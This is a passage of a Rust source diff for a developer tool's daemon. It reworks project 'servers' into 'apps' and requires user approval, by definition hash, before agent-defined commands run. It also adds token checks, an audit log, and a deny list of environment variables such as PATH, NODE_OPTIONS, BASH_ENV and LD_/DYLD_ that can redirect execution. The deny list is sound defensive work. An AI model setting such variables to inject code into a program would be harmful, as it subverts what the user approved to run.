@@ -1,34 +1,48 @@
-//! The project's servers: the backend, the frontend, TensorBoard, a notebook server. What a
-//! person would otherwise keep running in a split terminal, started by nib, each in a terminal
-//! of its own, and gone with the window.
+//! The project's apps: what a person would otherwise keep running in a split terminal (a
+//! backend and its frontend, TensorBoard, a notebook server), started by nib, each process in
+//! a terminal of its own, and gone with the window.
 //!
-//! They are defined in `$NIBDIR/serve.json` on the daemon's machine:
+//! An app is the one thing registered, opened, stopped and removed; its servers are the
+//! processes it runs. They are defined in `$NIBDIR/apps.json` on the daemon's machine:
 //!
 //! ```json
-//! { "servers": {
-//!     "backend":  { "cmd": "uv run app serve --port 8765", "port": 8765 },
-//!     "frontend": { "cmd": "uv run app frontend --port 8766", "port": 8766,
-//!                   "after": ["backend"], "view": "/" } } }
+//! { "apps": {
+//!     "demo": { "title": "Demo", "page": { "server": "web", "path": "/" },
+//!               "servers": {
+//!                 "api": { "cmd": "uv run app serve --port 8765", "port": 8765 },
+//!                 "web": { "cmd": "uv run app frontend --port 8766", "port": 8766, "after": ["api"] } },
+//!               "origin": { "by": "agent:claude-3", "at": 1795000000 }, "approved": "…" } } }
 //! ```
 //!
 //! `cmd` is run by the user's shell in a PTY (`pty`), in `cwd` (inside the project), with `env`
 //! added. A server is `ready` once its `port` accepts a connection on 127.0.0.1 or `[::1]` (one
-//! with no port: as soon as it runs); one that comes `after` others is started when their ports
-//! answer, and given up (`exited`, with the reason in its log) if one of them ended or was
-//! stopped before its port ever did.
-//! A port that already answers before the start means something else has it (another project's
-//! server, an older run): the server is not started, and says `port-taken`.
+//! with no port: as soon as it runs); one that comes `after` others of its app is started when
+//! their ports answer, and given up (`exited`, with the reason in its log) if one of them ended
+//! or was stopped before its port ever did. A port that already answers before the start means
+//! something else has it (another project's server, an older run): the server is not started,
+//! and says `port-taken`.
 //!
-//! The window asks with `Request::Serve` and hears of every change as `ServerNotify::Server`.
-//! Agents ask with `nib-serve …` (`nibd serve …`, see `cli`): a short-lived process, so it leaves
-//! its request as a file in the session's mailbox folder (`serve/req/`), which the daemon reads
-//! on its next turn and answers in `serve/res/`, as the mailbox does for letters.
+//! An app is a command nib keeps and runs later, so it must not be a way in: an app
+//! defined by anybody but the user (an agent, `nib ctl`) waits for the user's approval of its
+//! exact definition (`approved` is its hash, set only by `AppOp::Approve` from the user), and
+//! any change takes the approval away. The user's requests start only approved apps; an agent
+//! may start the app it defined itself (its harness already let it run that command), nothing
+//! else does. Agents' requests carry their session's token (`tokens`): a request without one
+//! is refused. Every change is written to `$NIBDIR/apps.log.jsonl`.
+//!
+//! The window asks with `Request::App` and hears of every change as `ServerNotify::App`.
+//! Agents ask with `nib-app …` (`nibd app …`, see `cli`): a short-lived process, so it leaves
+//! its request as a file in the session's mailbox folder (`app/req/`), which the daemon reads
+//! on its next turn and answers in `app/res/`, as the mailbox does for letters.
 
 use crate::pty::Ptys;
-use nib_proto::{ErrorKind, LogLevel, PtyId, RpcError, ServeOp, ServerDef, ServerInfo, ServerMsg, ServerNotify, ServerState};
-use serde_json::Value;
-use std::collections::{BTreeMap, HashMap};
+use nib_proto::{AppDef, AppInfo, AppOp, AppOrigin, ErrorKind, LogLevel, PtyId, RpcError, ServerDef, ServerInfo, ServerMsg, ServerNotify, ServerState};
+use serde::{Deserialize, Serialize};
+use serde_json::{json, Value};
+use sha2::{Digest, Sha256};
+use std::collections::{BTreeMap, BTreeSet, HashMap};
 use std::fs;
+use std::io::{Read, Write};
 use std::net::{SocketAddr, TcpStream};
 use std::num::NonZeroU16;
 use std::path::{Path, PathBuf};
@@ -41,15 +55,71 @@ use std::time::{Duration, Instant, SystemTime, UNIX_EPOCH};
 const TICK: Duration = Duration::from_millis(200);
 /// A restarted server waits this long for its old port to be free.
 const FREE_PORT: Duration = Duration::from_secs(10);
-/// How many lines of a server's output are kept for `nib-serve log`.
+/// How many lines of a server's output are kept for `nib-app log`.
 const LOG_LINES: usize = 5000;
 
-pub type Defs = BTreeMap<String, ServerDef>;
+/// Every app, by name, as the file keeps it.
+pub type Apps = BTreeMap<String, Stored>;
+/// Every server of every app, by key (`app/server`), with `after` as keys too: what runs.
+type Defs = BTreeMap<String, ServerDef>;
 pub type Shared = Arc<Mutex<Servers>>;
+
+/// An app as `apps.json` keeps it: its definition, who made it, and the user's approval.
+#[derive(Debug, Clone, Default, Serialize, Deserialize, PartialEq)]
+pub struct Stored {
+    #[serde(flatten)]
+    pub def: AppDef,
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub origin: Option<AppOrigin>,
+    /// The hash of the definition the user approved.
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub approved: Option<String>,
+}
+
+/// Who asks.
+#[derive(Debug, Clone, PartialEq)]
+pub enum Who {
+    /// The person at the window.
+    User,
+    /// `nib ctl`, or anything else the window passes on.
+    Ctl,
+    /// An agent nib started, by the name its token was given to.
+    Agent(String),
+}
+
+impl Who {
+    fn by(&self) -> String {
+        match self {
+            Who::User => "user".into(),
+            Who::Ctl => "nib ctl".into(),
+            Who::Agent(n) => format!("agent:{n}"),
+        }
+    }
+}
+
+/// A server's key among all that run: `app/server`.
+fn key(app: &str, server: &str) -> String {
+    format!("{app}/{server}")
+}
+
+/// The app a key is of.
+fn app_of(key: &str) -> &str {
+    key.split_once('/').map_or(key, |(a, _)| a)
+}
+
+/// What names a definition, whatever the order its maps were written in.
+pub fn hash(def: &AppDef) -> String {
+    let text = serde_json::to_vec(def).unwrap_or_default();
+    Sha256::digest(&text).iter().map(|b| format!("{b:02x}")).collect()
+}
+
+fn now() -> u64 {
+    SystemTime::now().duration_since(UNIX_EPOCH).map_or(0, |d| d.as_secs())
+}
 
 /// A server that was started (or asked to) in this session.
 struct Run {
-    /// As it was when started: the file may have changed since.
+    /// As it was when started, `after` as keys: the file may have changed since.
     def: ServerDef,
     /// The ports of the servers it comes after.
     after: Vec<u16>,
@@ -135,27 +205,28 @@ impl Printed {
 
 pub struct Servers {
     root: PathBuf,
-    /// `$NIBDIR/serve.json` (`None`: no NIBDIR on this machine).
+    /// `$NIBDIR/apps.json` (`None`: no NIBDIR on this machine).
     file: Option<PathBuf>,
-    /// Where agents leave their requests (`<mailbox>/serve`; made by the first one that asks).
+    /// Where agents leave their requests (`<mailbox>/app`; made by the first one that asks).
     dir: PathBuf,
     /// What every terminal gets: `NIB_SCRATCH`, `NIBDIR`.
     env: Vec<(&'static str, PathBuf)>,
     ptys: Arc<Mutex<Ptys>>,
     tx: Sender<ServerMsg>,
+    /// By key (`app/server`).
     runs: BTreeMap<String, Run>,
     me: Weak<Mutex<Servers>>,
 }
 
-/// The servers of the project at `root`, and the thread that looks after them for as long as
+/// The apps of the project at `root`, and the thread that looks after them for as long as
 /// they are kept.
 pub fn new(root: &Path, nibdir: Option<&Path>, scratch: Option<&Path>, mailbox: &Path, ptys: Arc<Mutex<Ptys>>, tx: Sender<ServerMsg>) -> Shared {
-    let dir = mailbox.join("serve");
+    let dir = mailbox.join("app");
     let mut env = Vec::new();
     env.extend(scratch.map(|p| ("NIB_SCRATCH", p.to_path_buf())));
     env.extend(nibdir.map(|p| ("NIBDIR", p.to_path_buf())));
     let shared = Arc::new_cyclic(|me| {
-        Mutex::new(Servers { root: root.to_path_buf(), file: nibdir.map(|d| d.join("serve.json")), dir, env, ptys, tx, runs: BTreeMap::new(), me: me.clone() })
+        Mutex::new(Servers { root: root.to_path_buf(), file: nibdir.map(|d| d.join("apps.json")), dir, env, ptys, tx, runs: BTreeMap::new(), me: me.clone() })
     });
     let weak = Arc::downgrade(&shared);
     thread::spawn(move || loop {
@@ -200,256 +271,429 @@ fn bad(msg: impl Into<String>) -> RpcError {
     RpcError::new(ErrorKind::BadRequest, msg)
 }
 
-/// A server's name: `[a-z0-9_-]{1,32}`.
+/// An app's or a server's name: `[a-z0-9_-]{1,32}`.
 fn name_ok(name: &str) -> bool {
     (1..=32).contains(&name.len()) && name.bytes().all(|b| b.is_ascii_lowercase() || b.is_ascii_digit() || b == b'_' || b == b'-')
 }
 
-/// Every definition makes sense, alone and with the others. The message says which does not.
-pub fn validate(defs: &Defs) -> Result<(), String> {
-    for (name, d) in defs {
-        if !name_ok(name) {
-            return Err(format!("server name {name:?}: use 1 to 32 of a-z, 0-9, _ and -"));
+/// Variables that make a program load or run something else than its command says (a
+/// library, a startup script, another program of the same name): not settable by an app.
+const DENIED_ENV: &[&str] = &[
+    "PATH", "NODE_OPTIONS", "PYTHONSTARTUP", "PYTHONPATH", "PYTHONHOME", "PERL5OPT", "PERL5LIB", "RUBYOPT", "BASH_ENV", "ENV", "PROMPT_COMMAND", "ZDOTDIR", "SHELL", "COMSPEC",
+    "PATHEXT",
+];
+const DENIED_ENV_PREFIX: &[&str] = &["LD_", "DYLD_"];
+
+fn env_denied(name: &str) -> bool {
+    let up = name.to_ascii_uppercase();
+    DENIED_ENV.contains(&up.as_str()) || DENIED_ENV_PREFIX.iter().any(|p| up.starts_with(p))
+}
+
+/// App `name`'s definition makes sense, alone and with its own servers. The message says
+/// what does not.
+pub fn validate(name: &str, def: &AppDef) -> Result<(), String> {
+    if !name_ok(name) {
+        return Err(format!("app name {name:?}: use 1 to 32 of a-z, 0-9, _ and -"));
+    }
+    if def.servers.is_empty() {
+        return Err(format!("{name}: an app runs at least one server"));
+    }
+    for (s, d) in &def.servers {
+        let at = key(name, s);
+        if !name_ok(s) {
+            return Err(format!("{name}: server name {s:?}: use 1 to 32 of a-z, 0-9, _ and -"));
         }
         if d.cmd.trim().is_empty() {
-            return Err(format!("{name}: cmd is empty"));
+            return Err(format!("{at}: cmd is empty"));
         }
         if d.port == Some(0) {
-            return Err(format!("{name}: port must be 1 to 65535"));
-        }
-        if let Some(v) = &d.view {
-            if !v.starts_with('/') {
-                return Err(format!("{name}: view {v:?} must be a path starting with /"));
-            }
-            if d.port.is_none() {
-                return Err(format!("{name}: view needs a port"));
-            }
+            return Err(format!("{at}: port must be 1 to 65535"));
         }
         if let Some(c) = &d.cwd {
             let p = Path::new(c);
             if p.is_absolute() || c.starts_with(['/', '\\', '~']) || p.components().any(|c| matches!(c, std::path::Component::ParentDir)) {
-                return Err(format!("{name}: cwd {c:?} must be a folder inside the project (relative, no ..)"));
+                return Err(format!("{at}: cwd {c:?} must be a folder inside the project (relative, no ..)"));
             }
         }
         if let Some(k) = d.env.keys().find(|k| k.is_empty() || k.contains('=')) {
-            return Err(format!("{name}: env name {k:?} is not a variable name"));
+            return Err(format!("{at}: env name {k:?} is not a variable name"));
+        }
+        if let Some(k) = d.env.keys().find(|k| env_denied(k)) {
+            return Err(format!("{at}: env {k} is not allowed: it changes what runs, not how (put what the command needs in the command)"));
         }
         for a in &d.after {
-            match defs.get(a) {
-                _ if a == name => return Err(format!("{name}: comes after itself")),
-                None => return Err(format!("{name}: comes after {a}, which is not defined")),
-                Some(o) if o.port.is_none() => return Err(format!("{name}: comes after {a}, which has no port to wait for")),
+            match def.servers.get(a) {
+                _ if a == s => return Err(format!("{at}: comes after itself")),
+                None => return Err(format!("{at}: comes after {a}, which is not a server of {name}")),
+                Some(o) if o.port.is_none() => return Err(format!("{at}: comes after {a}, which has no port to wait for")),
                 Some(_) => {}
             }
         }
     }
     // No server waits, through the others, for itself.
-    fn reaches(defs: &Defs, from: &str, to: &str, left: usize) -> bool {
+    fn reaches(defs: &BTreeMap<String, ServerDef>, from: &str, to: &str, left: usize) -> bool {
         left > 0 && defs.get(from).is_some_and(|d| d.after.iter().any(|a| a == to || reaches(defs, a, to, left - 1)))
     }
-    match defs.keys().find(|n| reaches(defs, n, n, defs.len())) {
-        Some(n) => Err(format!("{n}: comes after itself (a cycle in after)")),
-        None => Ok(()),
+    if let Some(s) = def.servers.keys().find(|n| reaches(&def.servers, n, n, def.servers.len())) {
+        return Err(format!("{}: comes after itself (a cycle in after)", key(name, s)));
     }
+    if let Some(p) = &def.page {
+        match def.servers.get(&p.server) {
+            None => return Err(format!("{name}: its page is on {:?}, which is not one of its servers", p.server)),
+            Some(d) if d.port.is_none() => return Err(format!("{name}: its page is on {}, which has no port", p.server)),
+            Some(_) => {}
+        }
+        if !p.path.starts_with('/') {
+            return Err(format!("{name}: page path {:?} must start with /", p.path));
+        }
+    }
+    Ok(())
 }
 
-/// What a definition may say.
-const KEYS: &[&str] = &["cmd", "port", "after", "view", "cwd", "env", "title"];
+/// What an app, a server and a page may say: a misspelt key would otherwise be dropped
+/// without a word.
+const APP_KEYS: &[&str] = &["title", "page", "servers"];
+const STORED_KEYS: &[&str] = &["origin", "approved"];
+const SERVER_KEYS: &[&str] = &["cmd", "port", "after", "cwd", "env"];
+const PAGE_KEYS: &[&str] = &["server", "path"];
 
-/// The definitions in `file` (none if there is no file), checked.
-pub fn read(file: &Path) -> Result<Defs, String> {
+fn unknown_key(v: &Value, known: &[&[&str]]) -> Option<String> {
+    v.as_object()?.keys().find(|k| !known.iter().any(|ks| ks.contains(&k.as_str()))).cloned()
+}
+
+/// App `name`'s definition from JSON (what `nib-app set` sends, an app in the file), strictly.
+pub fn parse_def(name: &str, v: &Value) -> Result<AppDef, String> {
+    if !v.is_object() {
+        return Err(format!("{name}: an app is an object: {{ \"title\", \"page\", \"servers\" }}"));
+    }
+    if let Some(k) = unknown_key(v, &[APP_KEYS]) {
+        return Err(format!("{name}: unknown key {k:?} (known: {})", APP_KEYS.join(", ")));
+    }
+    if let Some(p) = v.get("page").filter(|p| !p.is_null()) {
+        if let Some(k) = unknown_key(p, &[PAGE_KEYS]) {
+            return Err(format!("{name}: page: unknown key {k:?} (known: {})", PAGE_KEYS.join(", ")));
+        }
+    }
+    match v.get("servers") {
+        Some(Value::Object(m)) => {
+            for (s, d) in m {
+                if let Some(k) = unknown_key(d, &[SERVER_KEYS]) {
+                    return Err(format!("{}: unknown key {k:?} (known: {})", key(name, s), SERVER_KEYS.join(", ")));
+                }
+            }
+        }
+        Some(_) => return Err(format!("{name}: \"servers\" must be an object of name: server")),
+        None => return Err(format!("{name}: \"servers\" is needed (an object of name: server)")),
+    }
+    serde_json::from_value(v.clone()).map_err(|e| format!("{name}: {e}"))
+}
+
+/// The apps in `file` (none if there is no file), checked.
+pub fn read(file: &Path) -> Result<Apps, String> {
     let text = match fs::read_to_string(file) {
         Ok(t) => t,
-        Err(e) if e.kind() == std::io::ErrorKind::NotFound => return Ok(Defs::new()),
+        Err(e) if e.kind() == std::io::ErrorKind::NotFound => return Ok(Apps::new()),
         Err(e) => return Err(format!("{}: {e}", file.display())),
     };
     let wrong = |e: String| format!("{}: {e}", file.display());
     let v: Value = serde_json::from_str(&text).map_err(|e| wrong(e.to_string()))?;
-    let servers = match v.get("servers") {
+    let apps = match v.get("apps") {
         Some(Value::Object(m)) => m,
-        Some(_) => return Err(wrong("\"servers\" must be an object of name: definition".into())),
-        None => return Ok(Defs::new()),
+        Some(_) => return Err(wrong("\"apps\" must be an object of name: app".into())),
+        None => return Ok(Apps::new()),
     };
-    let mut defs = Defs::new();
-    for (name, d) in servers {
-        // A misspelt key would otherwise be dropped without a word.
-        if let Some(k) = d.as_object().and_then(|o| o.keys().find(|k| !KEYS.contains(&k.as_str()))) {
-            return Err(wrong(format!("{name}: unknown key {k:?} (known: {})", KEYS.join(", "))));
+    let mut out = Apps::new();
+    for (name, a) in apps {
+        if let Some(k) = unknown_key(a, &[APP_KEYS, STORED_KEYS]) {
+            return Err(wrong(format!("{name}: unknown key {k:?} (known: {})", [APP_KEYS, STORED_KEYS].concat().join(", "))));
         }
-        let def: ServerDef = serde_json::from_value(d.clone()).map_err(|e| wrong(format!("{name}: {e}")))?;
-        defs.insert(name.clone(), def);
+        let mut bare = a.clone();
+        if let Some(o) = bare.as_object_mut() {
+            o.remove("origin");
+            o.remove("approved");
+        }
+        let def = parse_def(name, &bare).map_err(wrong)?;
+        validate(name, &def).map_err(wrong)?;
+        let origin = a.get("origin").map(|o| serde_json::from_value(o.clone())).transpose().map_err(|e| wrong(format!("{name}: origin: {e}")))?;
+        let approved = a.get("approved").and_then(Value::as_str).map(str::to_string);
+        out.insert(name.clone(), Stored { def, origin, approved });
     }
-    validate(&defs).map_err(wrong)?;
-    Ok(defs)
+    Ok(out)
 }
 
 /// Whole or not at all (written beside, then renamed).
-pub fn write(file: &Path, defs: &Defs) -> std::io::Result<()> {
-    let text = serde_json::to_string_pretty(&serde_json::json!({ "servers": defs }))?;
+pub fn write(file: &Path, apps: &Apps) -> std::io::Result<()> {
+    let text = serde_json::to_string_pretty(&json!({ "apps": apps }))?;
     let tmp = file.with_extension("json.tmp");
     fs::write(&tmp, text + "\n")?;
     fs::rename(tmp, file)
 }
 
+/// Every server of every app as it runs: by key, `after` as keys.
+fn flat(apps: &Apps) -> Defs {
+    let mut out = Defs::new();
+    for (app, st) in apps {
+        for (s, d) in &st.def.servers {
+            let after = d.after.iter().map(|a| key(app, a)).collect();
+            out.insert(key(app, s), ServerDef { after, ..d.clone() });
+        }
+    }
+    out
+}
+
+/// May `who` start `app` as it is defined now? The message says why not.
+fn may_run(who: &Who, app: &str, st: &Stored) -> Result<(), String> {
+    if st.approved.as_deref() == Some(hash(&st.def).as_str()) {
+        return Ok(());
+    }
+    let by = st.origin.as_ref().map_or("somebody", |o| o.by.as_str());
+    match who {
+        Who::Agent(_) if st.origin.as_ref().is_some_and(|o| o.by == who.by()) => Ok(()),
+        Who::User => Err(format!("{app} is not approved yet (defined by {by}): open it from the Apps panel to see its commands and approve them")),
+        _ => Err(format!("{app} waits for the user's approval (defined by {by}): they see its commands and approve them the first time they open it from the Apps panel")),
+    }
+}
+
 impl Servers {
     fn file(&self) -> Result<&Path, String> {
-        self.file.as_deref().ok_or_else(|| "no NIBDIR on this machine to keep serve.json in (see the daemon log)".to_string())
+        self.file.as_deref().ok_or_else(|| "no NIBDIR on this machine to keep apps.json in (see the daemon log)".to_string())
     }
 
-    fn defs(&self) -> Result<Defs, String> {
+    fn apps(&self) -> Result<Apps, String> {
         read(self.file()?)
     }
 
-    fn info(&self, name: &str, def: Option<&ServerDef>) -> ServerInfo {
-        let run = self.runs.get(name);
-        ServerInfo {
-            name: name.to_string(),
-            def: def.or(run.map(|r| &r.def)).cloned().unwrap_or_default(),
-            state: run.map_or(ServerState::Stopped, |r| r.state),
-            pty: run.and_then(|r| r.pty),
+    fn save(&self, apps: &Apps) -> Result<(), String> {
+        write(self.file()?, apps).map_err(|e| format!("writing apps.json: {e}"))
+    }
+
+    /// One line in `$NIBDIR/apps.log.jsonl`: who did what to which app.
+    fn audit(&self, who: &Who, did: &str, app: &str, def: Option<&AppDef>) {
+        let Some(file) = self.file.as_ref().map(|f| f.with_file_name("apps.log.jsonl")) else { return };
+        let line = json!({ "at": now(), "by": who.by(), "did": did, "app": app, "def": def });
+        if let Ok(mut f) = fs::OpenOptions::new().create(true).append(true).open(file) {
+            let _ = writeln!(f, "{line}");
+        }
+    }
+
+    fn info(&self, app: &str, st: Option<&Stored>) -> AppInfo {
+        let def = st.map(|s| s.def.clone()).unwrap_or_default();
+        let prefix = format!("{app}/");
+        let mut names: BTreeSet<String> = def.servers.keys().cloned().collect();
+        names.extend(self.runs.keys().filter_map(|k| k.strip_prefix(&prefix)).map(str::to_string));
+        let servers = names
+            .into_iter()
+            .map(|s| {
+                let run = self.runs.get(&key(app, &s));
+                // A server the file no longer has, still running: as it was started.
+                let def = def.servers.get(&s).cloned().or_else(|| {
+                    run.map(|r| ServerDef { after: r.def.after.iter().map(|a| a.strip_prefix(&prefix).unwrap_or(a).to_string()).collect(), ..r.def.clone() })
+                });
+                ServerInfo { def: def.unwrap_or_default(), state: run.map_or(ServerState::Stopped, |r| r.state), pty: run.and_then(|r| r.pty), name: s }
+            })
+            .collect();
+        let h = hash(&def);
+        AppInfo {
+            name: app.to_string(),
+            approved: st.is_some_and(|s| s.approved.as_deref() == Some(h.as_str())),
+            origin: st.and_then(|s| s.origin.clone()),
+            hash: h,
+            def,
+            servers,
             removed: false,
         }
     }
 
-    /// Every server defined, and any still running whose definition is gone from the file.
-    fn list(&self, defs: &Defs) -> Vec<ServerInfo> {
-        let mut names: Vec<&String> = defs.keys().chain(self.runs.keys().filter(|n| !defs.contains_key(*n))).collect();
-        names.sort();
-        names.into_iter().map(|n| self.info(n, defs.get(n))).collect()
+    /// Every app defined, and any still running whose definition is gone from the file.
+    fn list(&self, apps: &Apps) -> Vec<AppInfo> {
+        let mut names: BTreeSet<&str> = apps.keys().map(String::as_str).collect();
+        names.extend(self.runs.keys().map(|k| app_of(k)));
+        names.into_iter().map(|n| self.info(n, apps.get(n))).collect()
     }
 
-    /// Tell the window how `name` is now.
-    fn tell(&self, name: &str) {
-        let def = self.defs().ok().and_then(|d| d.get(name).cloned());
-        let _ = self.tx.send(ServerMsg::Notify(ServerNotify::Server(self.info(name, def.as_ref()))));
+    /// Tell the window how `app` is now.
+    fn tell(&self, app: &str) {
+        let apps = self.apps().unwrap_or_default();
+        let _ = self.tx.send(ServerMsg::Notify(ServerNotify::App(self.info(app, apps.get(app)))));
     }
 
-    fn set_state(&mut self, name: &str, state: ServerState) {
-        if let Some(r) = self.runs.get_mut(name) {
+    fn set_state(&mut self, key: &str, state: ServerState) {
+        if let Some(r) = self.runs.get_mut(key) {
             r.state = state;
         }
-        self.tell(name);
+        self.tell(app_of(key));
     }
 
-    pub fn request(&mut self, op: ServeOp) -> Result<Vec<ServerInfo>, RpcError> {
-        self.act(op).map_err(bad)
+    /// The window asks: `user`, the person at it; otherwise `nib ctl` or the like.
+    pub fn request(&mut self, op: AppOp, user: bool) -> Result<Vec<AppInfo>, RpcError> {
+        self.act(op, &if user { Who::User } else { Who::Ctl }).map_err(bad)
     }
 
-    fn act(&mut self, op: ServeOp) -> Result<Vec<ServerInfo>, String> {
-        let mut defs = self.defs()?;
-        let known = |defs: &Defs, name: &str| match defs.contains_key(name) {
+    fn act(&mut self, op: AppOp, who: &Who) -> Result<Vec<AppInfo>, String> {
+        let mut apps = self.apps()?;
+        let known = |apps: &Apps, name: &str| match apps.contains_key(name) {
             true => Ok(()),
-            false if defs.is_empty() => Err(format!("no server named {name:?}: none is defined yet (serve set NAME --cmd …)")),
-            false => Err(format!("no server named {name:?}; there are: {}", defs.keys().cloned().collect::<Vec<_>>().join(", "))),
+            false if apps.is_empty() => Err(format!("no app named {name:?}: none is registered yet (nib-app set APP --json FILE)")),
+            false => Err(format!("no app named {name:?}; there are: {}", apps.keys().cloned().collect::<Vec<_>>().join(", "))),
         };
         match op {
-            ServeOp::List => {}
-            ServeOp::Set { name, def } => {
-                defs.insert(name.clone(), def);
-                validate(&defs)?;
-                write(self.file()?, &defs).map_err(|e| format!("writing serve.json: {e}"))?;
+            AppOp::List => {}
+            AppOp::Set { name, def } => {
+                validate(&name, &def)?;
+                // The user's own definition is approved as they save it; anybody else's waits.
+                let approved = (*who == Who::User).then(|| hash(&def));
+                self.audit(who, "set", &name, Some(&def));
+                apps.insert(name.clone(), Stored { def, origin: Some(AppOrigin { by: who.by(), at: now() }), approved });
+                self.save(&apps)?;
                 self.tell(&name);
             }
-            ServeOp::Remove { name } => {
-                known(&defs, &name)?;
-                defs.remove(&name);
-                validate(&defs)?;
-                write(self.file()?, &defs).map_err(|e| format!("writing serve.json: {e}"))?;
-                self.stop(&name);
-                self.runs.remove(&name);
-                let gone = ServerInfo { name, removed: true, ..Default::default() };
-                let _ = self.tx.send(ServerMsg::Notify(ServerNotify::Server(gone)));
+            AppOp::Remove { name } => {
+                known(&apps, &name)?;
+                apps.remove(&name);
+                self.save(&apps)?;
+                self.audit(who, "rm", &name, None);
+                let keys: Vec<String> = self.runs.keys().filter(|k| app_of(k) == name).cloned().collect();
+                for k in &keys {
+                    self.stop(k);
+                    self.runs.remove(k);
+                }
+                let gone = AppInfo { name, removed: true, ..Default::default() };
+                let _ = self.tx.send(ServerMsg::Notify(ServerNotify::App(gone)));
             }
-            ServeOp::Up { names } => {
-                names.iter().try_for_each(|n| known(&defs, n))?;
-                if defs.is_empty() {
-                    return Err("no servers are defined yet (serve set NAME --cmd …)".into());
+            AppOp::Up { names } => {
+                if apps.is_empty() {
+                    return Err("no apps are registered yet (nib-app set APP --json FILE)".into());
                 }
-                // With the servers each one comes after, and theirs.
-                let mut want: Vec<String> = if names.is_empty() { defs.keys().cloned().collect() } else { names };
-                let mut i = 0;
-                while i < want.len() {
-                    let after = defs.get(&want[i]).map(|d| d.after.clone()).unwrap_or_default();
-                    want.extend(after.into_iter().filter(|a| !want.contains(a)).collect::<Vec<_>>());
-                    i += 1;
-                }
-                for name in want {
-                    self.up(&name, &defs, None);
+                let names: Vec<String> = if names.is_empty() {
+                    // All: those this one may start; the others are said, not started.
+                    let (go, wait): (Vec<&String>, Vec<&String>) = apps.keys().partition(|n| may_run(who, n, &apps[*n]).is_ok());
+                    if go.is_empty() {
+                        return Err(format!("no app is approved yet ({}): open each from the Apps panel to approve it", wait.iter().map(|s| s.as_str()).collect::<Vec<_>>().join(", ")));
+                    }
+                    if !wait.is_empty() {
+                        let msg = format!("not started, waiting for approval: {}", wait.iter().map(|s| s.as_str()).collect::<Vec<_>>().join(", "));
+                        let _ = self.tx.send(ServerMsg::Notify(ServerNotify::Log { level: LogLevel::Warn, msg }));
+                    }
+                    go.into_iter().cloned().collect()
+                } else {
+                    for n in &names {
+                        known(&apps, n)?;
+                        may_run(who, n, &apps[n])?;
+                    }
+                    names
+                };
+                let defs = flat(&apps);
+                for app in names {
+                    for s in apps[&app].def.servers.keys() {
+                        self.up(&key(&app, s), &defs, None);
+                    }
                 }
             }
-            ServeOp::Down { names } => {
-                let names: Vec<String> = if names.is_empty() { self.runs.keys().cloned().collect() } else { names };
+            AppOp::Down { names } => {
+                let names: Vec<String> = match names.is_empty() {
+                    true => self.runs.keys().map(|k| app_of(k).to_string()).collect::<BTreeSet<_>>().into_iter().collect(),
+                    false => names,
+                };
                 for name in names {
-                    if !self.runs.contains_key(&name) {
-                        known(&defs, &name)?;
+                    let keys: Vec<String> = self.runs.keys().filter(|k| app_of(k) == name).cloned().collect();
+                    if keys.is_empty() {
+                        known(&apps, &name)?;
                     }
-                    self.stop(&name);
+                    for k in keys {
+                        self.stop(&k);
+                    }
                 }
             }
-            ServeOp::Restart { name } => {
-                known(&defs, &name)?;
-                // Not said to be stopped on the way: the window keeps its terminal.
-                if let Some(r) = self.runs.get_mut(&name) {
-                    if let Some(id) = r.pty.take() {
-                        self.ptys.lock().unwrap().close(id);
+            AppOp::Restart { name, server } => {
+                known(&apps, &name)?;
+                may_run(who, &name, &apps[&name])?;
+                let servers: Vec<String> = match server {
+                    Some(s) if apps[&name].def.servers.contains_key(&s) => vec![s],
+                    Some(s) => return Err(format!("{name} has no server {s:?}; it has: {}", apps[&name].def.servers.keys().cloned().collect::<Vec<_>>().join(", "))),
+                    None => apps[&name].def.servers.keys().cloned().collect(),
+                };
+                let defs = flat(&apps);
+                // Not said to be stopped on the way: the window keeps their terminals.
+                for s in &servers {
+                    if let Some(r) = self.runs.get_mut(&key(&name, s)) {
+                        if let Some(id) = r.pty.take() {
+                            self.ptys.lock().unwrap().close(id);
+                        }
+                        r.state = ServerState::Stopped;
                     }
-                    r.state = ServerState::Stopped;
                 }
-                self.up(&name, &defs, Some(Instant::now() + FREE_PORT));
+                for s in &servers {
+                    self.up(&key(&name, s), &defs, Some(Instant::now() + FREE_PORT));
+                }
+            }
+            AppOp::Approve { name, hash: shown } => {
+                if *who != Who::User {
+                    return Err("only the user approves an app, from the Apps panel".into());
+                }
+                known(&apps, &name)?;
+                let st = apps.get_mut(&name).expect("known");
+                if hash(&st.def) != shown {
+                    return Err(format!("{name} changed since it was shown: look at it again"));
+                }
+                st.approved = Some(shown);
+                let def = st.def.clone();
+                self.save(&apps)?;
+                self.audit(who, "approve", &name, Some(&def));
+                self.tell(&name);
             }
         }
-        Ok(self.list(&defs))
+        Ok(self.list(&apps))
     }
 
-    /// Ask for `name` to run: it waits its turn (`advance` starts it). One already running or
-    /// on its way is left alone.
-    fn up(&mut self, name: &str, defs: &Defs, free_by: Option<Instant>) {
-        let Some(def) = defs.get(name) else { return };
-        if self.runs.get(name).is_some_and(|r| r.state.coming() || r.state == ServerState::Ready) {
+    /// Ask for server `key` to run: it waits its turn (`advance` starts it). One already
+    /// running or on its way is left alone.
+    fn up(&mut self, key: &str, defs: &Defs, free_by: Option<Instant>) {
+        let Some(def) = defs.get(key) else { return };
+        if self.runs.get(key).is_some_and(|r| r.state.coming() || r.state == ServerState::Ready) {
             return;
         }
         let after = def.after.iter().filter_map(|a| defs.get(a).and_then(|d| d.port)).collect();
-        let log = self.runs.get(name).map(|r| r.log.clone()).unwrap_or_default();
-        self.runs.insert(name.to_string(), Run { def: def.clone(), after, state: ServerState::Waiting, pty: None, free_by, log });
-        self.tell(name);
+        let log = self.runs.get(key).map(|r| r.log.clone()).unwrap_or_default();
+        self.runs.insert(key.to_string(), Run { def: def.clone(), after, state: ServerState::Waiting, pty: None, free_by, log });
+        self.tell(app_of(key));
     }
 
-    /// Stop `name` if it runs or is about to.
-    fn stop(&mut self, name: &str) {
-        let Some(r) = self.runs.get_mut(name) else { return };
+    /// Stop server `key` if it runs or is about to.
+    fn stop(&mut self, key: &str) {
+        let Some(r) = self.runs.get_mut(key) else { return };
         if let Some(id) = r.pty.take() {
             self.ptys.lock().unwrap().close(id);
         }
         if r.state != ServerState::Stopped {
-            self.set_state(name, ServerState::Stopped);
+            self.set_state(key, ServerState::Stopped);
         }
     }
 
     /// The window closed terminal `id`: if it was a server's, the server is stopped.
     pub fn closed(&mut self, id: PtyId) {
-        if let Some(name) = self.runs.iter().find(|(_, r)| r.pty == Some(id)).map(|(n, _)| n.clone()) {
-            if let Some(r) = self.runs.get_mut(&name) {
